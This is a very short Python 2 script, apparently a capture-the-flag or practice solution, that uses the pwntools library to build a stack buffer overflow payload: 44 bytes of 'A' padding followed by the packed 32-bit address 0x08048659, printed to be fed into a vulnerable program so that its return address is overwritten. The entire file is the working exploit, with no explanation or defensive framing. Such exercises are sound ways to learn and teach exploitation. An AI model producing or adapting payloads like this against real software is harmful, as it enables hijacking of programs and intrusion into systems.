import pwn

junk = "A"*44

adress = pwn.p32(0x08048659)

print junk + adress
